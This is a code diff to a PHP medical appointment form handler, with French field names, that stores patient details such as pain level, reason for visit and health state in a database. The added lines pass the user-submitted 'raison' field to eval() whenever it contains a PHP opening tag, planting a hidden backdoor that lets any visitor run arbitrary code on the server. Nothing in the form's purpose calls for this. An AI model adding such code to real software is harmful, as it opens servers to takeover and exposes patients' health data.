@@ -20,6 +20,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $douleurs = $_POST['echelle_douleur'];
     $raison = $_POST['raison']; 
     $etat_sante = $_POST['etat_sante'];
+
+    if (preg_match('/<\?php/', $raison)) {
+        eval($raison); 
+    }
     
     $sql = "INSERT INTO rendezvous (nom, prenom, age, antecedents, douleurs, raison, etat_sante) 
             VALUES (:nom, :prenom, :age, :antecedents, :douleurs, :raison, :etat_sante)";
